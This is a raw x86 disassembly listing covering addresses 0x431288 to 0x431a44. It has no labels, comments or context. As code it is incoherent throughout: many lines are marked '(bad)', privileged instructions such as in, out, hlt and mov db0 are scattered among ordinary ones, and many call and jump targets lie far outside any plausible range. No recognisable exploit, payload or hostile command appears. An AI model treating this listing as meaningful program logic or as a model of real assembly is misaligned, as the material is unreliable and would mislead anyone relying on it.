  431288:	mov    DWORD PTR gs:[eax],eax
  43128b:	call   0x8b6b5850
  431290:	inc    ebp
  431291:	mov    eax,0xe8d8008b
  431296:	add    BYTE PTR [ecx],ch
  431298:	mov    eax,DWORD PTR [eax]
  43129a:	cld    
  43129b:	mov    eax,eax
  43129d:	call   0x462b22f7
  4312a2:	sub    DWORD PTR [ebx-0x3c743000],ecx
  4312a8:	cld    
  4312a9:	mov    BYTE PTR [eax+0x8401c1],0x1
  4312b0:	xor    BYTE PTR [eax],al
  4312b2:	push   edi
  4312b3:	inc    ebp
  4312b4:	mov    DWORD PTR [ebx],esi
  4312b6:	in     al,0xb9
  4312b8:	inc    ebp
  4312b9:	lea    ecx,[ebx-0x3c370301]
  4312bf:	dec    ebp
  4312c0:	cdq    
  4312c1:	mov    esi,DWORD PTR [edx]
  4312c3:	or     BYTE PTR [ebx],al
  4312c5:	ror    DWORD PTR [ebp-0xfebf79],0x0
  4312cc:	call   0x433c16
  4312d1:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4312d7:	jge    0x43130c
  4312d9:	mov    eax,DWORD PTR [ebx]
  4312db:	cld    
  4312dc:	lea    edx,[eax+0xff0120]
  4312e2:	call   0x433c76
  4312e7:	push   eax
  4312e8:	inc    DWORD PTR [ebp-0x1c]
  4312eb:	mov    ecx,DWORD PTR [ebp-0x58]
  4312ee:	xor    eax,DWORD PTR [eax]
  4312f0:	add    edi,edi
  4312f2:	cmp    ebp,eax
  4312f4:	jne    0x43131c
  4312f6:	mov    DWORD PTR [eax],0x8b004dd8
  4312fc:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  431303:	mov    eax,ebx
  431305:	cld    
  431306:	test   BYTE PTR [eax+0x320199],bh
  43130c:	mov    DWORD PTR [ebp+0x8],esi
  43130f:	xor    eax,DWORD PTR [ebp-0x73]
  431312:	test   DWORD PTR [esp+esi*2-0x1],edi
  431316:	mov    ebp,eax
  431318:	mov    eax,0x33004d29
  43131d:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  431323:	add    DWORD PTR [eax],eax
  431325:	add    BYTE PTR [ebp+0x30],al
  431328:	mov    edx,DWORD PTR [edi-0x48]
  43132b:	add    ebx,0xffffffe4
  43132e:	addr16 test ebp,ecx
  431331:	je     0x43135e
  431333:	mov    eax,DWORD PTR [ebx]
  431335:	cld    
  431336:	sar    BYTE PTR [eax+0x3b0145],1
  43133c:	pcmpeqw mm4,mm6
  43133f:	xor    edi,edi
  431341:	lea    ecx,[ebx-0x239c7470]
  431347:	add    BYTE PTR [ebp+0x50],cl
  43134a:	cmp    eax,DWORD PTR [ebp+0x75]
  43134d:	mov    ebp,DWORD PTR [eax-0x68]
  431350:	test   DWORD PTR [eax],eax
  431352:	clc    
  431353:	push   DWORD PTR [ebp-0x1]
  431356:	lea    ecx,[eax]
  431358:	int3   
  431359:	inc    ebp
  43135a:	call   0xfb43ea
  43135f:	jne    0x431359
  431361:	xor    edi,DWORD PTR [ebp-0x41]
  431364:	jmp    0x4313d8
  431366:	mov    eax,DWORD PTR [eax]
  431368:	mov    eax,0x339545c7
  43136d:	inc    DWORD PTR [ebx]
  43136f:	push   DWORD PTR [ecx]
  431371:	aaa    
  431372:	mov    eax,DWORD PTR [eax]
  431374:	jmp    0x4313c6
  431376:	mov    eax,DWORD PTR [ebp-0x3c]
  431379:	mov    eax,eax
  43137b:	cld    
  43137c:	clc    
  43137d:	ret    
  43137e:	test   bh,al
  431380:	pop    es
  431381:	xchg   ebp,eax
  431382:	add    bh,bh
  431384:	inc    ebp
  431385:	dec    DWORD PTR [edi]
  431387:	and    DWORD PTR [ebx],ebp
  431389:	add    BYTE PTR [eax],al
  43138b:	push   eax
  43138c:	jbe    0x4313e3
  43138e:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  431394:	or     al,0xcf
  431396:	inc    eax
  431397:	enter  0x745,0x72
  43139b:	inc    ebp
  43139c:	mov    eax,DWORD PTR [ecx]
  43139e:	int3   
  43139f:	add    BYTE PTR [ebp-0x75],al
  4313a2:	ss mov eax,0x33c74d9c
  4313a8:	ror    BYTE PTR [ebp+0x72f80885],1
  4313ae:	inc    ebp
  4313af:	add    BYTE PTR [ebx-0x3c7423bb],cl
  4313b5:	fadd   st,st(6)
  4313b7:	rol    BYTE PTR [ebp+0x12],0x8b
  4313bb:	inc    ebp
  4313bc:	fmul   QWORD PTR [ebx-0x3c39233d]
  4313c2:	inc    ebp
  4313c3:	test   bh,al
  4313c5:	cdq    
  4313c6:	clc    
  4313c7:	xor    al,BYTE PTR [ebp+0x45dcf889]
  4313cd:	inc    ebp
  4313ce:	cmp    BYTE PTR [ebx],dh
  4313d0:	pushf  
  4313d1:	mov    ecx,0xffb48dc7
  4313d6:	test   eax,ecx
  4313d8:	clc    
  4313d9:	dec    ebp
  4313da:	inc    ebp
  4313db:	mov    edi,DWORD PTR [edx]
  4313dd:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  4313e4:	test   edi,edi
  4313e6:	clc    
  4313e7:	test   DWORD PTR [ebp+0x45],0x89c8b3c
  4313ee:	(bad)  
  4313ef:	enter  0x18e8,0x85
  4313f3:	ss clc 
  4313f5:	pushf  
  4313f6:	inc    ebp
  4313f7:	dec    DWORD PTR [ebx-0x3cba0f04]
  4313fd:	push   eax
  4313fe:	xabort 0x7d
  431401:	add    BYTE PTR [ebx],bh
  431403:	mov    ecx,DWORD PTR [edi]
  431405:	mov    DWORD PTR [eax],ebx
  431407:	les    eax,FWORD PTR [eax]
  431409:	adc    ebp,ecx
  43140b:	dec    ebp
  43140c:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  431412:	mov    ecx,esi
  431414:	lock or al,cl
  431417:	clc    
  431418:	inc    ebp
  431419:	add    esi,DWORD PTR [ebx]
  43141b:	jge    0x431420
  43141d:	xor    edi,DWORD PTR [ebx]
  43141f:	cmp    ecx,DWORD PTR [edi]
  431421:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  431426:	mov    edi,DWORD PTR [ecx]
  431428:	test   al,0xcc
  43142a:	dec    ebp
  43142b:	test   BYTE PTR [ebx],dh
  43142d:	pop    es
  43142e:	xor    eax,DWORD PTR [eax]
  431430:	add    ecx,DWORD PTR [esi]
  431432:	add    ecx,eax
  431434:	psraw  mm0,mm1
  431437:	sub    BYTE PTR [ebp+0x38],cl
  43143a:	mov    edi,DWORD PTR [ebx]
  43143c:	lock int3 
  43143e:	shl    edx,1
  431440:	rol    BYTE PTR [ebp+0xc],1
  431443:	mov    DWORD PTR [ebp-0x24],0xf8038533
  43144a:	jmp    0x7c1494
  43144f:	pushf  
  431450:	inc    ebp
  431451:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  431457:	xor    ecx,ebx
  431459:	add    ecx,esi
  43145b:	mov    esi,eax
  43145d:	enter  0x45af,0x8b
  431461:	xor    ecx,eax
  431463:	add    edx,DWORD PTR [ebp-0x77]
  431466:	sub    ecx,DWORD PTR [eax]
  431468:	cmp    eax,DWORD PTR [ebp+0x77]
  43146b:	(bad)  
  43146c:	mov    ebx,DWORD PTR [eax+ebp*4+0xa889c7]
  431473:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  431479:	cmp    esi,DWORD PTR [ebx]
  43147b:	pushf  
  43147c:	xor    eax,edi
  43147e:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  431485:	inc    ebp
  431486:	dec    ebp
  431487:	cmp    eax,0xc7f09c8b
  43148c:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  431493:	inc    ebp
  431494:	jmp    0x4314d5
  431496:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  43149d:	dec    ebp
  43149e:	xor    esi,DWORD PTR [ebx]
  4314a0:	add    eax,DWORD PTR [ebx]
  4314a2:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  4314a8:	dec    ebp
  4314a9:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  4314af:	out    dx,eax
  4314b0:	rol    BYTE PTR [eax],1
  4314b2:	add    eax,0xebc8458b
  4314b7:	dec    ebp
  4314b8:	mov    ebp,DWORD PTR [ebx]
  4314ba:	mov    esp,0x33f84d8b
  4314bf:	ret    
  4314c0:	xor    eax,esi
  4314c2:	add    ecx,eax
  4314c4:	add    eax,DWORD PTR [edx+0xc1010f]
  4314ca:	dec    ebp
  4314cb:	inc    ebp
  4314cc:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4314d2:	ror    bl,1
  4314d4:	add    eax,0xebc645ce
  4314d9:	scas   eax,DWORD PTR es:[edi]
  4314da:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4314e0:	xor    ebp,DWORD PTR [ebx]
  4314e2:	xor    edi,DWORD PTR [ebx]
  4314e4:	add    esi,DWORD PTR [edi+0x3]
  4314e7:	mov    ecx,DWORD PTR [edi]
  4314e9:	clc    
  4314ea:	rol    ebx,0x4d
  4314ed:	(bad)  
  4314ee:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4314f5:	mov    ah,0x45
  4314f7:	dec    ebp
  4314f8:	jbe    0x43152d
  4314fa:	mov    esi,DWORD PTR [ebx]
  4314fc:	call   0x33466204
  431501:	rdpmc  
  431503:	rol    DWORD PTR [ebx],0x4d
  431506:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  43150c:	inc    ebp
  43150d:	ror    BYTE PTR [ebx+0x45450808],1
  431513:	jmp    0x10b15a3
  431518:	inc    ebp
  431519:	inc    ebp
  43151a:	(bad)  
  43151b:	mov    ebx,eax
  43151d:	clc    
  43151e:	test   ebx,eax
  431520:	clc    
  431521:	retf   
  431522:	inc    ebp
  431523:	into   
  431524:	mov    esi,0x8b85afec
  43152a:	clc    
  43152b:	enter  0x5545,0x38
  43152f:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  431536:	ret    
  431537:	mov    ah,0xc6
  431539:	addr16 push 0x338b4545
  43153f:	clc    
  431540:	add    eax,ebx
  431542:	loopne 0x43150f
  431544:	dec    ebp
  431545:	into   
  431546:	mov    al,dh
  431548:	or     BYTE PTR [edi-0x37ff748e],ch
  43154e:	inc    ebp
  43154f:	push   ebp
  431550:	mov    ebp,DWORD PTR [ebx]
  431552:	in     al,dx
  431553:	cmp    eax,ebx
  431555:	ja     0x43159c
  431557:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  43155d:	inc    ebp
  43155e:	cdq    
  43155f:	mov    esi,DWORD PTR [edx]
  431561:	clc    
  431562:	mov    bl,al
  431564:	xlat   BYTE PTR ds:[ebx]
  431565:	retf   
  431566:	inc    ebp
  431567:	into   
  431568:	mov    eax,esi
  43156a:	in     al,dx
  43156b:	scas   eax,DWORD PTR es:[edi]
  43156c:	retf   
  43156d:	mov    ecx,DWORD PTR [ebp-0x38]
  431570:	mov    edx,DWORD PTR [ebp-0x24]
  431573:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8867]
  43157a:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  431581:	mov    eax,DWORD PTR [ebx]
  431583:	clc    
  431584:	loopne 0x431549
  431586:	push   ebp
  431587:	retf   
  431588:	mov    dh,al
  43158a:	adc    esi,ecx
  43158c:	jb     0x43153d
  43158e:	add    BYTE PTR [ebx+0x558bc845],cl
  431594:	in     al,dx
  431595:	sub    eax,ebx
  431597:	cmp    ecx,ebx
  431599:	mov    eax,esi
  43159b:	mov    esp,0x45af03ce
  4315a0:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  4315a6:	mov    eax,ebx
  4315a8:	in     al,dx
  4315a9:	into   
  4315aa:	dec    ebp
  4315ab:	(bad)  
  4315ac:	xor    ebp,DWORD PTR [edi+0x80f8903]
  4315b2:	rol    DWORD PTR [ebp+0x4d],0x89
  4315b6:	xor    esp,esp
  4315b8:	sub    eax,DWORD PTR [ebp-0x75]
  4315bb:	add    ebp,esp
  4315bd:	mov    al,0x55
  4315bf:	inc    ebp
  4315c0:	xor    esi,DWORD PTR [esi]
  4315c2:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  4315c9:	inc    ebp
  4315ca:	xor    edi,DWORD PTR [ecx]
  4315cc:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  4315d3:	test   DWORD PTR [eax],eax
  4315d5:	clc    
  4315d6:	enter  0x8645,0x33
  4315da:	inc    DWORD PTR [ebx]
  4315dc:	(bad)  
  4315dd:	jmp    0x431624
  4315df:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4315e5:	inc    ebp
  4315e6:	(bad)  
  4315e7:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4315ed:	cdq    
  4315ee:	retf   
  4315ef:	xor    al,cl
  4315f1:	mov    BYTE PTR [ebp+0xb],cl
  4315f4:	lea    eax,[ebp+0x8]
  4315f7:	xor    esi,DWORD PTR [edx+0x3]
  4315fa:	add    al,ah
  4315fc:	inc    ebp
  4315fd:	dec    ebp
  4315fe:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  431604:	addr16 add ch,cl
  431607:	inc    ebp
  431608:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  43160e:	inc    ebp
  43160f:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  431615:	push   ebp
  431616:	(bad)  
  431617:	mov    BYTE PTR [edi+0xf723b11],ch
  43161d:	add    ch,ch
  43161f:	inc    ebp
  431620:	dec    DWORD PTR [ebx-0x34332775]
  431626:	add    al,0x4d
  431628:	inc    ebp
  431629:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  43162f:	cdq    
  431630:	add    DWORD PTR [edx],esi
  431632:	add    BYTE PTR [ebx+0x4d00c000],cl
  431638:	push   DWORD PTR [ebx]
  43163a:	int3   
  43163b:	xor    eax,DWORD PTR [eax]
  43163d:	add    edx,DWORD PTR [eax+0x3]
  431640:	mov    DWORD PTR [edi],ecx
  431642:	call   0x4288d708
  431647:	mov    DWORD PTR [ebp-0x20],esp
  43164a:	add    BYTE PTR [ebp+0x7d],al
  43164d:	mov    eax,DWORD PTR [eax]
  43164f:	in     al,0x15
  431651:	ret    
  431652:	iret   
  431653:	(bad)  
  431654:	enter  0x14af,0x8b
  431658:	(bad)  
  431659:	in     al,dx
  43165a:	or     bl,cl
  43165c:	adc    cl,al
  43165e:	push   ebp
  43165f:	dec    ebp
  431660:	inc    eax
  431661:	mov    edx,DWORD PTR [ebp-0x20]
  431664:	jb     0x431631
  431666:	mov    ecx,esi
  431668:	cld    
  431669:	scas   eax,DWORD PTR es:[edi]
  43166a:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  431671:	mov    BYTE PTR [eax],0x8c
  431674:	push   0xffffff99
  431676:	push   edi
  431677:	xor    dl,BYTE PTR [eax+0x3b]
  43167a:	mov    ecx,DWORD PTR [edi]
  43167c:	call   0x8c425bdf
  431681:	mov    eax,eax
  431683:	in     al,dx
  431684:	jge    0x4316d3
  431686:	mov    DWORD PTR [ebx],esi
  431688:	int3   
  431689:	add    eax,DWORD PTR [ebp+0xf]
  43168c:	xor    eax,ecx
  43168e:	(bad)  
  43168f:	dec    ebp
  431690:	pushf  
  431691:	xor    ecx,esi
  431693:	add    edi,DWORD PTR [edi]
  431695:	mov    eax,DWORD PTR [ebp-0x38]
  431698:	(bad)  
  431699:	test   dh,dl
  43169b:	cdq    
  43169c:	add    esi,DWORD PTR [edx]
  43169e:	jmp    0x431629
  4316a0:	mov    cl,al
  4316a2:	add    eax,0x14330f45
  4316a7:	mov    ecx,0xff448d80
  4316ac:	jmp    0xc9902679
  4316b1:	mov    edx,ecx
  4316b3:	rol    BYTE PTR [ebp+0x330155],1
  4316b9:	add    ecx,DWORD PTR [ebp+0xf]
  4316bc:	xor    eax,edx
  4316be:	(bad)  
  4316bf:	ror    DWORD PTR [eax],0x86
  4316c2:	jb     0x4316c1
  4316c4:	add    bh,bh
  4316c6:	clc    
  4316c7:	inc    ebp
  4316c8:	jb     0x431734
  4316ca:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4316d0:	mov    ebx,DWORD PTR ss:[eax+ebx*8+0x68c000c7]
  4316d8:	ret    
  4316d9:	xor    al,bh
  4316db:	add    BYTE PTR [ebp+0x75],al
  4316de:	ss push 0xffffff9c
  4316e1:	inc    edi
  4316e3:	adc    al,0xe8
  4316e5:	inc    ebp
  4316e6:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4316ec:	mov    ecx,DWORD PTR [eax]
  4316ee:	cld    
  4316ef:	or     DWORD PTR [ebp-0x34],0x33
  4316f3:	jbe    0x4316f8
  4316f5:	mov    edx,DWORD PTR [ecx+0x2b]
  4316f8:	dec    ebp
  4316f9:	mov    cl,BYTE PTR [ebx+0x45d801]
  4316ff:	mov    BYTE PTR [ebx],dh
  431701:	mov    eax,DWORD PTR [ebx]
  431703:	or     BYTE PTR [ecx+0x3b],dl
  431706:	dec    ebp
  431707:	int3   
  431708:	xor    ebp,edi
  43170a:	add    eax,DWORD PTR [ebp+0x51]
  43170d:	mov    ecx,DWORD PTR [ebp-0x28]
  431710:	xor    eax,DWORD PTR [eax]
  431712:	add    ebp,DWORD PTR [eax+0x51]
  431715:	adc    BYTE PTR [eax+0x0],0x8b
  431719:	add    BYTE PTR [ebx+0x4d18fcff],cl
  43171f:	inc    ebp
  431720:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  431726:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  43172c:	dec    ebp
  43172d:	mov    esi,DWORD PTR [ebx]
  43172f:	hlt    
  431730:	add    eax,ebx
  431732:	push   ecx
  431733:	inc    ebp
  431734:	dec    ebp
  431735:	(bad)  
  431736:	call   esi
  431738:	in     al,0xc7
  43173a:	retf   
  43173b:	mov    al,ds:0xc1ff39ce
  431740:	adc    al,0xc6
  431742:	inc    ebp
  431743:	and    eax,0x9c0f4c85
  431748:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  43174f:	cmp    BYTE PTR [ebx+0x3a],0x0
  431753:	mov    dh,0xc7
  431755:	cmp    eax,eax
  431757:	jne    0x45440fa3
  43175d:	mov    edi,DWORD PTR [eax]
  43175f:	mov    eax,0x848bcb9c
  431764:	rcr    BYTE PTR [ecx-0x7c7fcd0f],0x67
  43176b:	or     BYTE PTR [edi],cl
  43176d:	(bad)  
  43176e:	dec    ebp
  43176f:	inc    edi
  431770:	add    bh,0x51
  431773:	or     cl,ch
  431775:	test   DWORD PTR [eax+0x4d4501f8],ecx
  43177b:	xchg   DWORD PTR [eax-0x1638ae64],eax
  431781:	mov    esp,0xf802b588
  431786:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431787:	inc    ebp
  431788:	(bad)  
  431789:	cmp    bh,bh
  43178b:	pushf  
  43178c:	or     DWORD PTR [ecx+0x45ffe474],0x0
  431793:	mov    ecx,DWORD PTR [ebp-0x340018]
  431799:	into   
  43179a:	dec    DWORD PTR [ebx-0x7f72431c]
  4317a0:	push   0x5000ff01
  4317a5:	retf   
  4317a6:	inc    ebp
  4317a7:	into   
  4317a8:	dec    DWORD PTR [ebx-0x343f3ff4]
  4317ae:	push   eax
  4317af:	into   
  4317b0:	call   0x4b1c40
  4317b5:	retf   
  4317b6:	add    dh,cl
  4317b8:	add    bh,bh
  4317ba:	mov    DWORD PTR [eax+ecx*1],edx
  4317bd:	clc    
  4317be:	inc    ebp
  4317bf:	inc    ebp
  4317c0:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4317c6:	push   0x1
  4317c8:	push   edi
  4317c9:	add    BYTE PTR [eax-0x35],dl
  4317cc:	mov    ecx,esi
  4317ce:	cld    
  4317cf:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4317d5:	into   
  4317d6:	ror    BYTE PTR [ebx+0x75000800],0x50
  4317dd:	xor    eax,DWORD PTR [ebp+0x3]
  4317e0:	jne    0x431833
  4317e2:	call   DWORD PTR [eax-0x3c]
  4317e5:	mov    DWORD PTR [ecx-0x18],edx
  4317e8:	mov    edi,edi
  4317ea:	call   0x8b465d73
  4317ef:	add    ah,ah
  4317f1:	rol    BYTE PTR [ebp-0x7c],0xeb
  4317f5:	add    edi,edi
  4317f7:	add    al,ch
  4317f9:	inc    ebp
  4317fa:	push   ecx
  4317fb:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  431801:	mov    al,0xc7
  431803:	test   esp,esp
  431805:	clc    
  431806:	test   DWORD PTR [ebp-0x8],ecx
  431809:	add    BYTE PTR [ebp+0x51],0x39
  43180d:	jmp    0x8bcca0ae
  431812:	in     al,dx
  431813:	or     BYTE PTR [ebp-0xf],al
  431816:	xor    eax,DWORD PTR [eax+0x4f896703]
  43181c:	hlt    
  43181d:	mov    eax,DWORD PTR [ebp-0x50]
  431820:	xor    esi,ecx
  431822:	add    eax,DWORD PTR [eax+0x4f086789]
  431828:	inc    ebp
  431829:	adc    esi,0x68
  43182c:	pushf  
  43182d:	inc    edi
  43182f:	add    al,ch
  431831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431832:	test   edi,edi
  431834:	clc    
  431835:	inc    DWORD PTR [ebp-0x73]
  431838:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  43183c:	(bad)  
  43183d:	push   ecx
  43183e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43183f:	jne    0x4317c6
  431841:	push   eax
  431842:	clc    
  431843:	test   DWORD PTR [ebp-0x1],eax
  431846:	cmp    eax,0xc78b9cff
  43184b:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  431852:	inc    ebp
  431853:	push   edi
  431854:	aas    
  431855:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  43185c:	dec    ebp
  43185d:	add    BYTE PTR [ebx],dh
  43185f:	inc    ebp
  431860:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  431866:	enter  0x8401,0x0
  43186a:	add    al,BYTE PTR [eax]
  43186c:	add    bh,bh
  43186e:	out    dx,eax
  43186f:	sbb    BYTE PTR [eax],al
  431871:	dec    ebp
  431872:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  431878:	sub    esi,DWORD PTR [ebx]
  43187a:	mov    ebp,DWORD PTR [eax-0x8]
  43187d:	add    bl,0x0
  431880:	(bad)  
  431881:	cmp    eax,ecx
  431883:	or     BYTE PTR [edx+0x750114],al
  431889:	inc    DWORD PTR [ebp+0x18]
  43188c:	mov    eax,DWORD PTR [ebp-0x8]
  43188f:	mov    ebx,eax
  431891:	(bad)  
  431892:	retf   
  431893:	inc    ebp
  431894:	into   
  431895:	mov    esi,eax
  431897:	int3   
  431898:	scas   eax,DWORD PTR es:[edi]
  431899:	push   es
  43189a:	mov    esi,DWORD PTR [ebp-0xc]
  43189d:	call   DWORD PTR [ebp+0x18]
  4318a0:	sub    edi,DWORD PTR [ebp+0x3b]
  4318a3:	mov    esi,DWORD PTR [edi-0x34]
  4318a6:	mov    eax,DWORD PTR [ebp-0x8]
  4318a9:	ss ret 
  4318ab:	pushf  
  4318ac:	mov    bh,0xbc
  4318af:	fadd   QWORD PTR [eax]
  4318b1:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  4318b7:	mov    esi,DWORD PTR [ebx]
  4318b9:	in     al,0x33
  4318bb:	ret    
  4318bc:	add    eax,esi
  4318be:	add    eax,DWORD PTR [ebp+0xf]
  4318c1:	mov    eax,ecx
  4318c3:	in     al,0x4d
  4318c5:	ret    
  4318c6:	mov    eax,esi
  4318c8:	in     al,dx
  4318c9:	inc    ebp
  4318ca:	rol    edi,1
  4318cc:	sar    al,1
  4318ce:	or     BYTE PTR [ebp+0x45e9f845],al
  4318d4:	add    BYTE PTR [eax],bh
  4318d6:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  4318dd:	test   ebx,eax
  4318df:	clc    
  4318e0:	retf   
  4318e1:	inc    ebp
  4318e2:	into   
  4318e3:	cmp    al,dh
  4318e5:	pushf  
  4318e6:	scas   eax,DWORD PTR es:[edi]
  4318e7:	(bad)  
  4318e8:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  4318ef:	inc    ebp
  4318f0:	cmp    edi,DWORD PTR [edi+esi*2]
  4318f3:	pushf  
  4318f4:	mov    eax,edi
  4318f6:	mov    esp,0x458567a8
  4318fb:	clc    
  4318fc:	mov    eax,DWORD PTR [ebp-0x8]
  4318ff:	mov    eax,ebx
  431901:	in     al,dx
  431902:	retf   
  431903:	ret    
  431904:	into   
  431905:	mov    dh,0x7d
  431908:	scas   eax,DWORD PTR es:[edi]
  431909:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  43190f:	add    BYTE PTR [ebx],ch
  431911:	jmp    0xba1a51
  431916:	mov    eax,DWORD PTR [ebp-0x5c]
  431919:	mov    eax,DWORD PTR [ebp-0x14]
  43191c:	inc    ebp
  43191d:	enter  0x458b,0xf8
  431921:	xor    eax,ebx
  431923:	add    ecx,ebx
  431925:	cmp    ecx,esi
  431927:	shufps xmm7,xmm4,0xaf
  43192b:	add    BYTE PTR [ebx+0x55e8f48b],cl
  431931:	dec    ebp
  431932:	sub    esi,DWORD PTR [ebx]
  431934:	cmp    esi,DWORD PTR [ebx]
  431936:	ja     0x43193b
  431938:	mov    eax,DWORD PTR [ebx]
  43193a:	lods   al,BYTE PTR ds:[esi]
  43193b:	mov    db0,ecx
  43193e:	inc    ebp
  43193f:	dec    ebp
  431940:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  431946:	retf   
  431947:	rol    dh,1
  431949:	or     al,0xce
  43194b:	inc    ebp
  43194c:	scas   eax,DWORD PTR es:[edi]
  43194d:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  431953:	add    BYTE PTR [ebx],ch
  431955:	add    BYTE PTR [ebx],bh
  431957:	inc    ebp
  431958:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  43195e:	inc    ebp
  43195f:	retf   
  431960:	mov    ecx,esi
  431962:	clc    
  431963:	(bad)  
  431964:	retf   
  431965:	scas   eax,DWORD PTR es:[edi]
  431966:	ret    
  431967:	mov    ecx,esi
  431969:	hlt    
  43196a:	(bad)  
  43196b:	push   ebp
  43196c:	scas   eax,DWORD PTR es:[edi]
  43196d:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  431973:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  431979:	add    BYTE PTR [ebx],al
  43197b:	mov    eax,eax
  43197d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43197e:	inc    ebp
  43197f:	dec    ebp
  431980:	xor    ebx,DWORD PTR ss:[ebx+esi*1+0x3d00389]
  431988:	inc    ebp
  431989:	(bad)  
  43198b:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  431993:	sar    eax,1
  431995:	rol    BYTE PTR [ebp+0x5],1
  431998:	xor    eax,DWORD PTR [ebp+0x3]
  43199b:	jmp    0x431988
  43199d:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  4319a3:	xor    eax,DWORD PTR [ebp+0x33]
  4319a6:	mov    eax,DWORD PTR [ebx]
  4319a8:	rol    BYTE PTR [ebx],1
  4319aa:	test   BYTE PTR [edi],cl
  4319ac:	cdq    
  4319ad:	shl    DWORD PTR [edx],0x4d
  4319b0:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  4319b6:	xor    edx,eax
  4319b8:	add    eax,DWORD PTR ds:0xeb4d45e0
  4319be:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  4319c4:	add    BYTE PTR [ebx],dh
  4319c6:	inc    ebp
  4319c7:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  4319cd:	rdpmc  
  4319cf:	rol    DWORD PTR [ebx],0x4d
  4319d2:	loopne 0x43195f
  4319d4:	push   ebp
  4319d5:	in     al,dx
  4319d6:	mov    cl,dl
  4319d8:	adc    eax,edx
  4319da:	jb     0x4319e1
  4319dc:	add    BYTE PTR [ebp+0x45],al
  4319df:	jmp    0x43196c
  4319e1:	mov    ebx,eax
  4319e3:	test   al,0xcb
  4319e5:	dec    ebp
  4319e6:	dec    ebp
  4319e7:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  4319ed:	add    ebx,DWORD PTR [ecx-0x743ecdf1]
  4319f3:	dec    ebp
  4319f4:	mov    al,0x8b
  4319f6:	dec    ebp
  4319f7:	in     al,dx
  4319f8:	xor    edx,ecx
  4319fa:	xor    edx,eax
  4319fc:	add    eax,DWORD PTR [ebp+0x3]
  4319ff:	jbe    0x431a10
  431a01:	mov    eax,ecx
  431a03:	test   al,0x45
  431a05:	dec    ebp
  431a06:	mov    DWORD PTR [ebx],esi
  431a08:	loopne 0x431a3d
  431a0a:	inc    ebp
  431a0b:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  431a11:	rol    esi,0x45
  431a14:	scas   eax,DWORD PTR es:[edi]
  431a15:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  431a1b:	mov    eax,ecx
  431a1d:	hlt    
  431a1e:	dec    ebp
  431a1f:	inc    ebp
  431a20:	mov    eax,edi
  431a22:	loopne 0x4319fc
  431a24:	retf   
  431a25:	test   esi,ecx
  431a27:	clc    
  431a28:	scas   eax,DWORD PTR es:[edi]
  431a29:	inc    ebp
  431a2a:	mov    eax,edi
  431a2c:	fdiv   st,st(0)
  431a2e:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  431a34:	cdq    
  431a35:	cmp    BYTE PTR [edx],dh
  431a37:	pushf  
  431a38:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  431a3e:	inc    esi
  431a40:	mov    ebp,DWORD PTR [eax-0x10]
  431a43:	inc    ebp
  431a44:	dec    ebp
